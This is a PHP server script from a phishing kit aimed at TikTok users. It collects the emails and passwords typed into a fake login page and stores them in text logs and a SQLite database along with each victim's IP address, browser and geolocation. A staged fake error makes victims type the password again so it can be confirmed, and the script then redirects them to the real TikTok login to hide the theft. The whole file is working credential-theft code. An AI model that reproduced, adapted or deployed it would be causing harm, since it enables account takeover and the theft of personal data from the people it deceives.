<?php
session_start();
class TikTokCredentialManager {
    private $platformCode = 'TK';
    private $platformName = 'tiktok';
    private $captureDir;
    private $dbFile;
    
    public function __construct() {
        $this->captureDir = '../../captures/' . $this->platformCode;
        if (!file_exists($this->captureDir)) {
            mkdir($this->captureDir, 0755, true);
        }
        $this->dbFile = $this->captureDir . '/' . $this->platformCode . '_credentials.db';
        $this->initializeDatabase();
    }
    
    private function initializeDatabase() {
        try {
            $db = new SQLite3($this->dbFile);
            $db->exec('CREATE TABLE IF NOT EXISTS ' . $this->platformCode . '_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                email TEXT,
                password TEXT,
                password_confirmed TEXT,
                ip_address TEXT,
                user_agent TEXT,
                geolocation TEXT,
                session_id TEXT,
                attempt_count INTEGER,
                is_confirmed BOOLEAN,
                capture_file TEXT
            )');
            $db->close();
        } catch (Exception $e) {
            error_log("TikTok DB init failed: " . $e->getMessage());
        }
    }
    
    private function getClientIP() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $headers = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR'];
        foreach ($headers as $header) {
            if (isset($_SERVER[$header])) {
                $ips = explode(',', $_SERVER[$header]);
                $ip = trim($ips[0]);
                break;
            }
        }
        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
    }
    
    private function getGeolocation($ip) {
        if ($ip === 'Unknown' || $ip === '127.0.0.1' || $ip === '::1') {
            return 'Localhost';
        }
        $cacheFile = $this->captureDir . '/geo_cache.json';
        $cache = file_exists($cacheFile) ? json_decode(file_get_contents($cacheFile), true) : [];
        if (isset($cache[$ip])) {
            return $cache[$ip];
        }
        $geoData = @file_get_contents("http://ip-api.com/json/" . $ip);
        if ($geoData) {
            $data = json_decode($geoData, true);
            if ($data['status'] === 'success') {
                $location = $data['city'] . ', ' . $data['country'];
                $cache[$ip] = $location;
                file_put_contents($cacheFile, json_encode($cache));
                return $location;
            }
        }
        return 'Unknown';
    }
    
    public function processCapture($email, $password, $attempt) {
        $ip = $this->getClientIP();
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $sessionId = session_id();
        $geolocation = $this->getGeolocation($ip);
        $timestamp = date('Y-m-d H:i:s');
        
        $txtFile = $this->captureDir . '/' . $this->platformCode . '_' . date('Ymd_His') . '_attempt' . $attempt . '.txt';
        
        if ($attempt == 1) {
            $content = "═══════════════════════════════════════════════════════════\n";
            $content .= "[ TIKTOK CAPTURE - FIRST ATTEMPT ] - " . $timestamp . "\n";
            $content .= "═══════════════════════════════════════════════════════════\n";
            $content .= "USER/EMAIL/PHONE: " . $email . "\n";
            $content .= "PASSWORD        : " . $password . "\n";
            $content .= "IP ADDRESS      : " . $ip . "\n";
            $content .= "GEOLOCATION     : " . $geolocation . "\n";
            $content .= "USER AGENT      : " . $userAgent . "\n";
            $content .= "═══════════════════════════════════════════════════════════\n\n";
            
            file_put_contents($txtFile, $content, FILE_APPEND | LOCK_EX);
            
            $_SESSION['tk_email'] = $email;
            $_SESSION['tk_pass1'] = $password;
            
            try {
                $db = new SQLite3($this->dbFile);
                $stmt = $db->prepare('INSERT INTO ' . $this->platformCode . '_credentials 
                    (email, password, ip_address, user_agent, geolocation, session_id, attempt_count, is_confirmed, capture_file) 
                    VALUES (:e, :p, :ip, :ua, :geo, :sid, 1, 0, :file)');
                $stmt->bindValue(':e', $email, SQLITE3_TEXT);
                $stmt->bindValue(':p', $password, SQLITE3_TEXT);
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->bindValue(':ua', $userAgent, SQLITE3_TEXT);
                $stmt->bindValue(':geo', $geolocation, SQLITE3_TEXT);
                $stmt->bindValue(':sid', $sessionId, SQLITE3_TEXT);
                $stmt->bindValue(':file', basename($txtFile), SQLITE3_TEXT);
                $stmt->execute();
                $db->close();
            } catch (Exception $e) {
                error_log("TikTok first attempt save failed: " . $e->getMessage());
            }
            
            return ['status' => 'first_attempt', 'redirect' => true];
            
        } else {
            $firstPass = $_SESSION['tk_pass1'] ?? '';
            $isConfirmed = ($password === $firstPass);
            
            $content = "═══════════════════════════════════════════════════════════\n";
            $content .= "[ TIKTOK CAPTURE - CONFIRMED ATTEMPT ] - " . $timestamp . "\n";
            $content .= "═══════════════════════════════════════════════════════════\n";
            $content .= "USER/EMAIL/PHONE: " . $email . "\n";
            $content .= "PASSWORD        : " . $password . "\n";
            $content .= "FIRST PASSWORD  : " . $firstPass . "\n";
            $content .= "MATCH           : " . ($isConfirmed ? 'YES ✓' : 'NO ✗') . "\n";
            $content .= "IP ADDRESS      : " . $ip . "\n";
            $content .= "GEOLOCATION     : " . $geolocation . "\n";
            $content .= "USER AGENT      : " . $userAgent . "\n";
            $content .= "═══════════════════════════════════════════════════════════\n\n";
            
            file_put_contents($txtFile, $content, FILE_APPEND | LOCK_EX);
            
            try {
                $db = new SQLite3($this->dbFile);
                $stmt = $db->prepare('INSERT INTO ' . $this->platformCode . '_credentials 
                    (email, password, password_confirmed, ip_address, user_agent, geolocation, session_id, attempt_count, is_confirmed, capture_file) 
                    VALUES (:e, :p, :pc, :ip, :ua, :geo, :sid, 2, :conf, :file)');
                $stmt->bindValue(':e', $email, SQLITE3_TEXT);
                $stmt->bindValue(':p', $firstPass, SQLITE3_TEXT);
                $stmt->bindValue(':pc', $password, SQLITE3_TEXT);
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->bindValue(':ua', $userAgent, SQLITE3_TEXT);
                $stmt->bindValue(':geo', $geolocation, SQLITE3_TEXT);
                $stmt->bindValue(':sid', $sessionId, SQLITE3_TEXT);
                $stmt->bindValue(':conf', $isConfirmed ? 1 : 0, SQLITE3_INTEGER);
                $stmt->bindValue(':file', basename($txtFile), SQLITE3_TEXT);
                $stmt->execute();
                $db->close();
                
                if ($isConfirmed) {
                    $summaryFile = $this->captureDir . '/CONFIRMED_SUMMARY.txt';
                    $summary = "✅ CONFIRMED | " . $email . " | " . $password . " | " . date('Y-m-d H:i:s') . "\n";
                    file_put_contents($summaryFile, $summary, FILE_APPEND);
                }
            } catch (Exception $e) {
                error_log("TikTok confirmed save failed: " . $e->getMessage());
            }
            
            session_destroy();
            return ['status' => 'confirmed', 'redirect' => true];
        }
    }
    
    public function redirectToLegitimate() {
        header('Location: https://www.tiktok.com/login/');
        exit();
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['pass'] ?? '';
    $attempt = isset($_POST['attempt']) ? (int)$_POST['attempt'] : 1;
    
    if (!empty($email) && !empty($password)) {
        $manager = new TikTokCredentialManager();
        $result = $manager->processCapture($email, $password, $attempt);
        
        if ($attempt == 1) {
            header('Location: index.html?error=1&email=' . urlencode($email));
            exit();
        } else {
            $manager->redirectToLegitimate();
        }
    }
}

header('Location: index.html');
exit();
?>